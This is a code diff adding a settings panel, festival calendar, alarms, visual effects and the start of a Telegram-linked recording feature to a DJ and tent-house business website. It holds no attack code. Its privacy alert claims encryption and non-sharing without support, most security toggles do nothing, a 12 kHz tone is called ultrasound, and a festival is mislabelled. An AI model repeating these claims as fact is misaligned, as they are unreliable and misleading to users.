+                    <i class="fas fa-stop-circle"></i> STOP RECORDING NOW
+                </button>
+
+                <button class="mn-btn" style="background:#25D366; width:100%; color:#fff;" onclick="requestVideoCall()"><i class="fas fa-phone-video"></i> Direct Telegram Video Call Router</button>
+                <div id="recordingStatus" style="color:#ff3333; font-weight:bold; font-size:12px; margin-top:10px; display:none; text-align:center;"><i class="fas fa-circle fa-beat"></i> Processing...</div>
             </div>
-            <div style="margin-top: 25px; padding-top: 20px; border-top: 1px dashed rgba(212,175,55,0.4); text-align: center;">
-                <p style="color:#D4AF37; font-family:'Cinzel'; font-weight:bold; font-size:18px; margin:0 0 10px 0;">📞 Contact / Booking:</p>
-                <a href="tel:+917294969938" style="display:inline-block; background:#25D366; color:#fff; padding:10px 25px; border-radius:30px; text-decoration:none; font-weight:bold; font-family:'Outfit'; margin:0 5px;">📞 Call Now</a>
-                <p style="color:#aaa; font-family:'Outfit'; font-size:12px; line-height:1.5; margin:15px 0 0 0;">
-                    <i class="fas fa-map-marker-alt" style="color:#ff3333;"></i> <b>Address:</b><br>
-                    Tola Beltikri, Kaddhar, Katoria, Banka, Bihar, India (813106)
+
+            <div class="settings-category">
+                <h3><i class="fas fa-clock"></i> Unlimited 3D Alarms & Calendar</h3>
+                <div style="background:rgba(255,153,51,0.1); border:1px solid #D4AF37; padding:15px; border-radius:12px; margin-bottom:15px;">
+                    <div style="color:#D4AF37; font-weight:bold;"><i class="fas fa-calendar-alt"></i> Indian Festival Radar</div>
+                    <div id="nextFestivalText" style="font-size:13px; color:#fff; margin-top:5px;">Loading Calendar...</div>
+                    <button class="mn-btn" style="margin-top:10px; font-size:11px; padding:5px 10px;" onclick="openCalendarModal()">View All Festivals</button>
+                </div>
+                <div style="display:flex; gap:10px; margin-bottom:10px;">
+                    <input type="time" id="newAlarmTime" class="mn-input" style="flex:1;">
+                    <button class="mn-btn" onclick="addCustomAlarm()">Add Alarm</button>
+                </div>
+                <ul id="activeAlarmsList" style="list-style:none; padding:0; margin:0; color:#fff; font-size:14px;"></ul>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-bell"></i> Notification Settings</h3>
+                <div class="setting-row"><div class="setting-label">🔔 Popup notification on/off</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">📩 Booking confirmation alerts</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🎉 Offer & festival notifications</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">📢 Announcement banner control</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-shield-alt"></i> Privacy & Security</h3>
+                <div class="setting-row"><div class="setting-label">🔐 Data protection settings</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">📜 Privacy policy display</div><button class="mn-btn" style="padding:5px 15px; font-size:12px;" onclick="alert('Privacy Policy: Your data is fully encrypted and never shared.')">View</button></div>
+                <div class="setting-row"><div class="setting-label">🍪 Cookie consent control</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🚫 Spam & fake booking protection</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-universal-access"></i> Language & Accessibility</h3>
+                <div class="setting-row">
+                    <div class="setting-label">🌍 Language switch (All India)</div>
+                    <div id="google_translate_element_settings"></div>
+                </div>
+                <div class="setting-row"><div class="setting-label">♿ Accessibility mode</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🗣️ Voice reading support</div><label class="mn-switch"><input type="checkbox" id="toggleVoice" onchange="applyAutoReader()"><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-music"></i> Sound & Media Settings</h3>
+                <div class="setting-row"><div class="setting-label">🔈 Background music on/off</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🎧 DJ sample music preview</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row" style="flex-direction:column; align-items:flex-start;">
+                    <div class="setting-label" style="margin-bottom:10px;">🔊 Volume control slider</div>
+                    <input type="range" min="1" max="100" value="100" style="width:100%; accent-color:#D4AF37;">
+                </div>
+                <div class="setting-row"><div class="setting-label">🎶 Auto-play music (permissions)</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row">
+                    <div class="setting-label">🎥 Video preview quality</div>
+                    <select class="mn-input" style="width:120px; padding:5px;"><option>Auto</option><option>Low</option><option>HD</option><option>Full HD</option></select>
+                </div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-paint-brush"></i> Appearance & Theme</h3>
+                <div class="setting-row"><div class="setting-label">🌙 Dark / ☀️ Light Mode</div><label class="mn-switch"><input type="checkbox" id="themeTgl" onchange="themeSwitch()" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row">
+                    <div class="setting-label">🎨 100+ Premium Colors</div>
+                    <select class="mn-input" style="width:120px; padding:5px;" onchange="document.documentElement.style.setProperty('--gold-primary', this.value);">
+                        <option value="#D4AF37">Royal Gold</option>
+                        <option value="#ff3333">DJ Red</option>
+                        <option value="#00e5ff">Neon Blue</option>
+                        <option value="#ff00ff">Magenta</option>
+                        <option value="#00ff00">Laser Green</option>
+                        <option value="#ff8c00">Sunset Orange</option>
+                        <option value="#8a2be2">Deep Purple</option>
+                        <option value="#ff1493">Deep Pink</option>
+                        <option value="#00fa9a">Neon Pink</option>
+                        <option value="#00ced1">Teal</option>
+                        <option value="#dc143c">Crimson</option>
+                        <option value="#c0c0c0">Luxury Silver</option>
+                        <option value="#ffffff">Pure White</option>
+                        <option value="#1a1a1a">Subwoofer Black</option>
+<option value="#ffbf00">Haldi Yellow</option>
+<option value="#e6e6fa">VIP Lounge Lavender</option>
+<option value="#ff4500">Pyro Spark Orange</option>
+<option value="#2e8b57">Pandal Canopy Green</option>
+<option value="#4b0082">Midnight Bass Indigo</option>
+<option value="#b8860b">Antique Brass Truss</option>
+<option value="#ff007f">Baaraat Rose</option>
+<option value="#00ffff">Strobe Cyan</option>
+<option value="#ffff00">Moving Head Yellow</option>
+<option value="#7fff00">Matrix Green</option>
+<option value="#ff69b4">Varmala Pink</option>
+<option value="#cd7f32">Bronze Stage</option>
+<option value="#800000">Velvet Drape Maroon</option>
+<option value="#40e0d0">Ambient Turquoise</option>
+<option value="#f0e68c">Chandelier Khaki</option>
+<option value="#8b4513">Rustic Wooden Stage</option>
+<option value="#fa8072">Sunset Wedding Salmon</option>
+<option value="#9932cc">Deep Bass Orchid</option>
+<option value="#20b2aa">LED Wash SeaGreen</option>
+<option value="#ff8c69">Festive Peach</option>
+<option value="#1e90ff">Cinematic Sky Blue</option>
+<option value="#c71585">Royal Carpet Red</option>
+<option value="#32cd32">Laser Beam Lime</option>
+<option value="#f5f5dc">Premium Tent Beige</option>
+<option value="#d2691e">Acoustic Wood Chocolate</option>
+<option value="#6a5acd">Stage Smoke Slate</option>
+<option value="#ffebcd">Halogen Warm White</option>
+<option value="#00008b">Night Sky Navy</option>
+<option value="#adff2f">Techno Yellow Green</option>
+<option value="#db7093">Pale Floral Violet</option>
+<option value="#f08080">Soft Uplight Coral</option>
+<option value="#00bfff">DJ Booth Azure</option>
+<option value="#8b008b">Grand Entrance Magenta</option>
+<option value="#b22222">Firebrick Red</option>
+<option value="#228b22">Floral Arch Forest</option>
+<option value="#ffb6c1">Bridal Blush Pink</option>
+<option value="#4682b4">Iron Rigging Steel</option>
+<option value="#d8bfd8">Romantic Thistle</option>
+<option value="#ffdab9">Elegance Peach Puff</option>
+<option value="#008080">Deep Water Teal</option>
+<option value="#e0ffff">Cold Spark Cyan</option>
+<option value="#daa520">Golden Hour Rod</option>
+<option value="#808080">Generator Smoke Grey</option>
+<option value="#fdf5e6">Silk Drapery Lace</option>
+<option value="#f000ff">High Frequency Fuchsia</option>
+<option value="#7b68ee">Dynamic Wash Purple</option>
+<option value="#556b2f">Rustic Olive</option>
+<option value="#cd5c5c">Majestic Indian Red</option>
+<option value="#000000">Absolute Blackout</option>
+
+                    </select>
+                </div>
+                <div class="setting-row">
+                    <div class="setting-label">🔠 100+ Font Styles</div>
+                    <select class="mn-input" style="width:120px; padding:5px;" onchange="document.body.style.fontFamily=this.value">
+                        <option value="'Outfit', sans-serif">Outfit (Default)</option>
+                        <option value="'Cinzel', serif">Cinzel (Luxury)</option>
+                        <option value="'Rajdhani', sans-serif">Rajdhani (Tech)</option>
+                        <option value="'Poppins', sans-serif">Poppins (Modern)</option>
+                        <option value="'Roboto', sans-serif">Roboto (Clean)</option>
+                        <option value="'Lato', sans-serif">Lato (Classic)</option>
+                        <option value="'Montserrat', sans-serif">Montserrat</option>
+                        <option value="'Oswald', sans-serif">Oswald (Bold)</option>
+                        <option value="'Ubuntu', sans-serif">Ubuntu</option>
+                        <option value="'Playfair Display', serif">Playfair (Elegant)</option>
+                        <option value="'Merriweather', serif">Merriweather</option>
+                        <option value="'Bebas Neue', sans-serif">Bebas Neue (Movie)</option>
+                        <option value="'Dancing Script', cursive">Dancing Script (Art)</option>
+                        <option value="'Lora', serif">Lora (Refined)</option>
+                        <option value="'Cormorant Garamond', serif">Cormorant Garamond (Royal)</option>
+                        <option value="'PT Serif', serif">PT Serif (Editorial)</option>
+                        <option value="'Crimson Text', serif">Crimson Text (Bookish)</option>
+                        <option value="'Libre Baskerville', serif">Libre Baskerville (Classic)</option>
+                        <option value="'EB Garamond', serif">EB Garamond (Heritage)</option>
+                        <option value="'Prata', serif">Prata (Boutique)</option>
+                        <option value="'Marcellus', serif">Marcellus (Roman)</option>
+                        <option value="'Alice', serif">Alice (Storybook)</option>
+                        <option value="'Vollkorn', serif">Vollkorn (Heavy Serif)</option>
+                        <option value="'Cinzel Decorative', display">Cinzel Decorative (Mythic)</option>
+                        <option value="'Aleo', serif">Aleo (Contemporary)</option>
+                        <option value="'Arvo', serif">Arvo (Sturdy Slab)</option>
+                        <option value="'Zilla Slab', serif">Zilla Slab (Sophisticated)</option>
+                        <option value="'Cardo', serif">Cardo (Scholar)</option>
+
+                        <option value="'Raleway', sans-serif">Raleway (Sleek)</option>
+                        <option value="'Nunito', sans-serif">Nunito (Friendly)</option>
+                        <option value="'Inter', sans-serif">Inter (UI/UX)</option>
+                        <option value="'Work Sans', sans-serif">Work Sans (Minimalist)</option>
+                        <option value="'Quicksand', sans-serif">Quicksand (Rounded)</option>
+                        <option value="'Jost', sans-serif">Jost (Futura Style)</option>
+                        <option value="'Fira Sans', sans-serif">Fira Sans (Dynamic)</option>
+                        <option value="'Barlow', sans-serif">Barlow (Highway)</option>
+                        <option value="'Cabin', sans-serif">Cabin (Humanist)</option>
+                        <option value="'Varela Round', sans-serif">Varela Round (Soft)</option>
+                        <option value="'Lexend', sans-serif">Lexend (Legible)</option>
+                        <option value="'Mulish', sans-serif">Mulish (Versatile)</option>
+                        <option value="'Mukta', sans-serif">Mukta (Indian Modern)</option>
+                        <option value="'Hind', sans-serif">Hind (Clean Reading)</option>
+                        <option value="'Questrial', sans-serif">Questrial (Architectural)</option>
+                        <option value="'Maven Pro', sans-serif">Maven Pro (Curved Tech)</option>
+                        <option value="'Archivo', sans-serif">Archivo (Grotesque)</option>
+                        <option value="'Heebo', sans-serif">Heebo (Sharp)</option>
+                        <option value="'Dosis', sans-serif">Dosis (Pill-shaped)</option>
+                        <option value="'Signika', sans-serif">Signika (Signage)</option>
+                        <option value="'Tenor Sans', sans-serif">Tenor Sans (Fashion)</option>
+
+                        <option value="'Orbitron', sans-serif">Orbitron (Laser Sci-Fi)</option>
+                        <option value="'Exo 2', sans-serif">Exo 2 (Futuristic)</option>
+                        <option value="'Audiowide', display">Audiowide (Electronic)</option>
+                        <option value="'Syncopate', sans-serif">Syncopate (Ultra Wide)</option>
+                        <option value="'Teko', sans-serif">Teko (Industrial Bass)</option>
+                        <option value="'Chakra Petch', sans-serif">Chakra Petch (Mecha Tech)</option>
+                        <option value="'Michroma', sans-serif">Michroma (Automotive)</option>
+                        <option value="'Quantico', sans-serif">Quantico (Military Tech)</option>
+                        <option value="'Jura', sans-serif">Jura (Euro Tech)</option>
+                        <option value="'Bruno Ace', display">Bruno Ace (Speed)</option>
+                        <option value="'Syne', sans-serif">Syne (Avant-Garde)</option>
+                        <option value="'Aldrich', sans-serif">Aldrich (Blueprint)</option>
+                        <option value="'Gruppo', display">Gruppo (Thin Stylish)</option>
+                        <option value="'Titillium Web', sans-serif">Titillium Web (Digital)</option>
+                        <option value="'Russo One', sans-serif">Russo One (Bold Tech)</option>
+
+                        <option value="'Anton', sans-serif">Anton (DJ Poster)</option>
+                        <option value="'Abril Fatface', display">Abril Fatface (Heavy Editorial)</option>
+                        <option value="'Righteous', display">Righteous (Retro Tech)</option>
+                        <option value="'Fjalla One', sans-serif">Fjalla One (Headline)</option>
+                        <option value="'Fredoka One', display">Fredoka One (Bubbly)</option>
+                        <option value="'Alfa Slab One', display">Alfa Slab One (Heavyweight)</option>
+                        <option value="'Carter One', display">Carter One (Retro Web)</option>
+                        <option value="'Patua One', display">Patua One (Soft Slab)</option>
+                        <option value="'Bangers', display">Bangers (Comic Book)</option>
+                        <option value="'Black Ops One', display">Black Ops One (Military)</option>
+                        <option value="'Saira', sans-serif">Saira (Super Wide Impact)</option>
+                        <option value="'Josefin Sans', sans-serif">Josefin Sans (Geometric)</option>
+                        <option value="'Yeseva One', display">Yeseva One (Feminine Heavy)</option>
+                        <option value="'Limelight', display">Limelight (Cinema)</option>
+                        <option value="'Fascinate', display">Fascinate (Art Deco)</option>
+                        <option value="'Allerta Stencil', sans-serif">Allerta Stencil (Crate)</option>
+
+                        <option value="'Great Vibes', cursive">Great Vibes (Varmala Script)</option>
+                        <option value="'Pacifico', cursive">Pacifico (Vibrant Surf)</option>
+                        <option value="'Lobster', cursive">Lobster (Festive)</option>
+                        <option value="'Sacramento', cursive">Sacramento (Invitation)</option>
+                        <option value="'Parisienne', cursive">Parisienne (Romantic)</option>
+                        <option value="'Yellowtail', cursive">Yellowtail (Brush Script)</option>
+                        <option value="'Cookie', cursive">Cookie (Sweet)</option>
+                        <option value="'Courgette', cursive">Courgette (Casual Script)</option>
+                        <option value="'Satisfy', cursive">Satisfy (Fluid)</option>
+                        <option value="'Kaushan Script', cursive">Kaushan Script (Energetic)</option>
+                        <option value="'Tangerine', cursive">Tangerine (Calligraphy)</option>
+                        <option value="'Berkshire Swash', cursive">Berkshire Swash (Magical)</option>
+                        <option value="'Caveat', cursive">Caveat (Handwritten Notes)</option>
+                        <option value="'Shadows Into Light', cursive">Shadows Into Light (Playful)</option>
+                        <option value="'Indie Flower', cursive">Indie Flower (Carefree)</option>
+                        <option value="'Amatic SC', cursive">Amatic SC (Handcrafted)</option>
+                        <option value="'Permanent Marker', cursive">Permanent Marker (Edgy Marker)</option>
+
+                        <option value="'Monoton', display">Monoton (Neon Lights)</option>
+                        <option value="'Vampiro One', display">Vampiro One (Neon Tube)</option>
+                        <option value="'Press Start 2P', display">Press Start 2P (Arcade 8-Bit)</option>
+                        <option value="'Bungee', display">Bungee (Urban Street)</option>
+                        <option value="'Creepster', display">Creepster (Spooky Halloween)</option>
+                        <option value="'Space Mono', monospace">Space Mono (Hacker)</option>
+                        <option value="'Roboto Mono', monospace">Roboto Mono (Developer)</option>
+                        <option value="'Fira Code', monospace">Fira Code (Code Terminal)</option>
+                        <option value="'Courier Prime', monospace">Courier Prime (Typewriter)</option>
+                    </select>
+                </div>
+                <div class="setting-row">
+                    <div class="setting-label">🔡 Font size control</div>
+                    <select class="mn-input" style="width:120px; padding:5px;" onchange="document.body.style.fontSize=this.value"><option value="16px">Medium</option><option value="14px">Small</option><option value="18px">Large</option></select>
+                </div>
+                <div class="setting-row"><div class="setting-label">✨ Animation on/off</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-magic"></i> Live Screen Effects</h3>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-eye" style="color:#4caf50;"></i> Eye Comfort Mode</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'eye-comfort-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-newspaper" style="color:#ccc;"></i> Newspaper Mode</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'newspaper-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-bullhorn" style="color:#ff3333;"></i> Earthquake Bass Shake</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'bass-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-palette" style="color:#00ff00;"></i> Dynamic RGB Lighting</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'rgb-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-snowflake" style="color:#fff;"></i> Magic Snowfall</div><label class="mn-switch"><input type="checkbox" onchange="applySnowfall(this)"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-meteor" style="color:#ff00ff;"></i> Galaxy Crackers Effect</div><label class="mn-switch"><input type="checkbox" onchange="applyCrackers(this)"><span class="mn-slider"></span></label></div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<div id="effect-layer" style="position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:9999997; overflow:hidden;"></div>
+<audio id="alarmAudio" loop><source src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg" type="audio/ogg"></audio>
+
+<style>
+    /* CRITICAL: FIXES ZOOM 100% - 120% LEFT/RIGHT SCROLL ISSUE */
+    html, body {
+        overflow-x: hidden !important; 
+        width: 100%; 
+        max-width: 100vw; 
+        margin: 0; 
+        padding: 0;
+    }
+    
+    /* Settings Modal Architecture */
+    .settings-category { background:rgba(255,255,255,0.02); border:1px solid rgba(212,175,55,0.2); border-radius:15px; padding:15px; margin-bottom:20px; }
+    .settings-category h3 { color:#D4AF37; font-family:'Cinzel', serif; font-size:16px; margin-top:0; margin-bottom:15px; border-bottom:1px dashed rgba(212,175,55,0.3); padding-bottom:10px; text-transform:uppercase; letter-spacing:1px; }
+    .setting-row { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid rgba(255,255,255,0.05); }
+    .setting-row:last-child { border-bottom:none; }
+    .setting-label { font-size:14px; color:#fff; display:flex; align-items:center; gap:10px; }
+    
+    /* Global Toggles & Inputs */
+    .mn-switch { position:relative; display:inline-block; width:45px; height:24px; flex-shrink:0; }
+    .mn-switch input { opacity:0; width:0; height:0; }
+    .mn-slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#333; transition:.4s; border-radius:34px; }
+    .mn-slider:before { position:absolute; content:""; height:16px; width:16px; left:4px; bottom:4px; background-color:white; transition:.4s; border-radius:50%; }
+    input:checked + .mn-slider { background-color:var(--gold-primary); box-shadow:0 0 10px var(--gold-primary); }
+    input:checked + .mn-slider:before { transform:translateX(21px); }
+    .mn-input { background:rgba(0,0,0,0.5); border:1px solid rgba(212,175,55,0.4); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:'Outfit'; box-sizing:border-box; }
+    .mn-input:focus { border-color:var(--gold-primary); }
+    .mn-btn { background:var(--gold-primary); color:#000; border:none; padding:10px 15px; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.3s; font-family:'Outfit'; }
+
+    /* Visual Effect Classes */
+    body.eye-comfort-mode { background-color:#fdf6e3 !important; color:#433f38 !important; filter:sepia(0.4) brightness(0.9) !important; }
+    body.eye-comfort-mode * { color:inherit !important; border-color:#d1c8b3 !important; }
+    body.newspaper-mode { background:#f4f1ea !important; color:#222 !important; font-family:'Georgia', serif !important; filter:none !important; }
+    body.newspaper-mode * { background:transparent !important; color:inherit !important; border-color:#555 !important; box-shadow:none !important; }
+    
+    @keyframes rgbGlowShift { 0% { filter:hue-rotate(0deg); } 50% { filter:hue-rotate(180deg); } 100% { filter:hue-rotate(360deg); } }
+    body.rgb-mode { animation:rgbGlowShift 4s linear infinite !important; }
+    
+    @keyframes heavyBassShake { 0%{transform:translate(3px,3px);} 20%{transform:translate(-4px,0px);} 40%{transform:translate(4px,-3px);} 60%{transform:translate(-3px,4px);} 80%{transform:translate(4px,1px);} 100%{transform:translate(-3px,-2px);} }
+    body.bass-mode { animation:heavyBassShake 0.2s infinite !important; }
+
+    /* Particles (Snow & Crackers) */
+    .snowflake { position:absolute; top:-10px; color:#fff; font-size:1.5em; animation:fall linear forwards; text-shadow:0 0 8px #fff; }
+    .cracker-spark { position:absolute; width: 5px; height: 20px; border-radius: 5px; animation:fall linear forwards; z-index:9999998; box-shadow: 0 0 15px currentColor; }
+    @keyframes fall { to { transform:translateY(105vh); } }
+    @keyframes flashRed { 0% { background: #ff0000; } 50% { background: #550000; } 100% { background: #ff0000; } }
+
+    /* Calendar Grid */
+    .cal-card { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid var(--gold-primary); display: flex; justify-content: space-between; align-items: center; }
+    .cal-card h4 { margin: 0 0 5px 0; color: #fff; font-family: 'Cinzel'; }
+    .cal-card p { margin: 0; color: #aaa; font-size: 12px; }
+</style>
+
+<script type="text/javascript">
+    // ALL INDIAN LANGUAGES MANDATORY IN TRANSLATE
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            includedLanguages: 'hi,bn,te,mr,ta,ur,gu,kn,or,ml,pa,as,mai,bho,en',
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+            autoDisplay: false
+        }, 'google_translate_element_settings'); // Binds to settings panel
+    }
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+<script>
+    // --- AUTOMATIC WELCOME POPUP ---
+    window.addEventListener('DOMContentLoaded', () => {
+        document.getElementById('royalWelcomePopup').style.display = 'flex';
+    });
+
+    // --- MODAL CONTROLS ---
+    function openMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'flex'; }
+    function closeMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'none'; }
+    function openCalendarModal() { document.getElementById('calendarModalOverlay').style.display = 'flex'; }
+    
+    // --- BASIC TOGGLES ---
+    function applyEffectClass(element, className) {
+        if(className === 'eye-comfort-mode' && element.checked) { document.body.classList.remove('newspaper-mode'); }
+        if(className === 'newspaper-mode' && element.checked) { document.body.classList.remove('eye-comfort-mode'); }
+        if (element.checked) document.body.classList.add(className);
+        else { document.body.classList.remove(className); if(className==='bass-mode') document.getElementById('alarmAudio').pause(); }
+    }
+    
+    function applyTextZoom(val) { document.body.style.zoom = val; }
+
+    // --- FULL INDIAN FESTIVAL CALENDAR ---
+    const allIndianFestivals = [
+        { name: "Makar Sankranti", date: "2026-01-14" }, { name: "Republic Day", date: "2026-01-26" },
+        { name: "Vasant Panchami", date: "2026-01-24" }, { name: "Maha Shivaratri", date: "2026-02-15" },
+        { name: "Holi", date: "2026-03-03" }, { name: "Ram Navami", date: "2026-03-26" },
+        { name: "Mahavir Jayanti", date: "2026-03-31" }, { name: "Good Friday (Eid)", date: "2026-03-20" },
+        { name: "Baisakhi", date: "2026-04-14" }, { name: "Buddha Purnima", date: "2026-05-01" },
+        { name: "Rath Yatra", date: "2026-07-15" }, { name: "Independence Day", date: "2026-08-15" },
+        { name: "Raksha Bandhan", date: "2026-08-28" }, { name: "Janmashtami", date: "2026-09-04" },
+        { name: "Ganesh Chaturthi", date: "2026-09-06" }, { name: "Onam", date: "2026-09-12" },
+        { name: "Navratri Starts", date: "2026-10-10" }, { name: "Durga Puja", date: "2026-10-16" },
+        { name: "Dussehra", date: "2026-10-19" }, { name: "Karwa Chauth", date: "2026-10-25" },
+        { name: "Diwali", date: "2026-11-08" }, { name: "Govardhan Puja", date: "2026-11-09" },
+        { name: "Bhai Dooj", date: "2026-11-10" }, { name: "Chhath Puja", date: "2026-11-14" },
+        { name: "Guru Nanak Jayanti", date: "2026-11-24" }, { name: "Christmas", date: "2026-12-25" }
+    ];
+
+    function initFestivals() {
+        const today = new Date(); let nextFest = null;
+        const calArea = document.getElementById('calendarListArea');
+        let calHtml = "";
+
+        for (let fest of allIndianFestivals) {
+            let festDate = new Date(fest.date);
+            const dateStr = festDate.toLocaleDateString('en-IN', { month: 'long', day: 'numeric', year: 'numeric' });
+            let isPast = festDate < today ? '<span style="color:#ff3333; font-size:10px;">(Passed)</span>' : '<span style="color:#00ff00; font-size:10px;">(Upcoming)</span>';
+            
+            calHtml += `<div class="cal-card"><div><h4>${fest.name} ${isPast}</h4><p>${dateStr}</p></div><i class="fas fa-music" style="color:var(--gold-primary);"></i></div>`;
+            
+            if (festDate >= today && !nextFest) { nextFest = fest; }
+        }
+        
+        if(calArea) calArea.innerHTML = calHtml;
+
+        if (nextFest) {
+            document.getElementById('nextFestivalText').innerText = `Next: ${nextFest.name} (${new Date(nextFest.date).toLocaleDateString('en-IN')})`;
+            if (new Date(nextFest.date).toDateString() === today.toDateString()) { setTimeout(() => alert(`🎉 Happy ${nextFest.name}! Book Maa Nirmala DJ!`), 2000); }
+        }
+    }
+    initFestivals();
+
+    // --- ULTRASOUND + VIBRATION + 3D ALARMS ---
+    let userAlarms = [];
+    function addCustomAlarm() {
+        const timeVal = document.getElementById('newAlarmTime').value;
+        if(!timeVal) return alert("Select a time first!");
+        userAlarms.push(timeVal);
+        document.getElementById('newAlarmTime').value = '';
+        renderAlarms();
+    }
+    function renderAlarms() {
+        const list = document.getElementById('activeAlarmsList');
+        list.innerHTML = userAlarms.map((a, i) => `<li style="padding:8px; background:rgba(255,255,255,0.05); margin-top:5px; border-radius:5px; display:flex; justify-content:space-between;">⏰ ${a} <span style="color:#ff3333; cursor:pointer;" onclick="removeAlarm(${i})">Delete</span></li>`).join('');
+    }
+    function removeAlarm(index) { userAlarms.splice(index, 1); renderAlarms(); }
+
+    setInterval(() => {
+        const now = new Date();
+        const timeString = now.toLocaleTimeString('en-IN', { hour12: false }).substring(0, 5);
+        if(userAlarms.includes(timeString) && now.getSeconds() === 0) {
+            triggerEarthquakeAlarm();
+        }
+    }, 1000);
+
+    function triggerEarthquakeAlarm() {
+        document.body.classList.add('bass-mode');
+        
+        // 1. Regular High Volume Audio
+        const audio = document.getElementById('alarmAudio'); 
+        if(audio) { audio.volume = 1.0; audio.play(); }
+
+        // 2. Hardware Vibration
+        if("vibrate" in navigator) navigator.vibrate([1000, 500, 1000, 500, 2000, 500, 3000]);
+
+        // 3. ULTRASOUND GENERATOR (Web Audio API)
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            oscillator.type = 'square';
+            oscillator.frequency.setValueAtTime(12000, audioCtx.currentTime); // High piercing frequency
+            oscillator.connect(audioCtx.destination);
+            oscillator.start();
+            setTimeout(() => oscillator.stop(), 5000); // Plays ultrasound for 5 seconds
+        } catch(e) { console.log("Web Audio API not supported for ultrasound."); }
+
+        alert("🚨 MAA NIRMALA DJ & TENT HOUSE BELTIKRI ALARM RINGING! 🚨");
+    }
+
+    // --- PARTICLES (SNOW & GALAXY CRACKERS) ---
+    let snowInt, crackerInt;
+    function applySnowfall(el) {
+        const layer = document.getElementById('effect-layer');
+        if (el.checked) {
+            snowInt = setInterval(() => {
+                const snow = document.createElement('div'); snow.className='snowflake'; snow.innerText='❄️';
+                snow.style.left = Math.random()*100+'vw'; snow.style.animationDuration = (Math.random()*3+2)+'s'; snow.style.fontSize = (Math.random()*15+10)+'px';
+                layer.appendChild(snow); setTimeout(() => snow.remove(), 4000);
+            }, 150);
+        } else { clearInterval(snowInt); layer.innerHTML=''; }
+    }
+    
+    function applyCrackers(el) {
+        const layer = document.getElementById('effect-layer');
+        const colors = ['#ff3333', '#00ff00', '#00e5ff', '#ff00ff', '#FFD700'];
+        if(el.checked) {
+            crackerInt = setInterval(() => {
+                const spark = document.createElement('div'); 
+                spark.className='cracker-spark';
+                const c = colors[Math.floor(Math.random() * colors.length)];
+                spark.style.color = c;
+                spark.style.backgroundColor = c;
+                spark.style.left = Math.random()*100+'vw'; 
+                spark.style.animationDuration = (Math.random()*2+1)+'s';
+                layer.appendChild(spark); setTimeout(() => spark.remove(), 3000);
+            }, 50); // High density crackers
+        } else { clearInterval(crackerInt); layer.innerHTML=''; }
+    }
+
+    // --- TELEGRAM 50s CAMERA & VOICE RECORDING ---
+    let mediaRecorder; let audioChunks = []; let currentFacingMode = 'environment'; let currentStream;
+    
+    function switchCamera() {
+        currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+        alert(currentFacingMode === 'user' ? "Front Camera Selected" : "Rear Camera Selected");
+    }
+
+    async function checkUser() {
+        const n = document.getElementById('mediaName').value; const p = document.getElementById('mediaNum').value;
+        if(!n || !p) { alert("⚠️ Name and Phone are Mandatory."); return false; } return {n,p};
+    }
+
+    function requestVideoCall() {
+        checkUser().then(u => { if(!u) return; window.open("https://t.me/+919771617808", "_blank"); });
+    }
+
+    async function startVoiceRecord() {
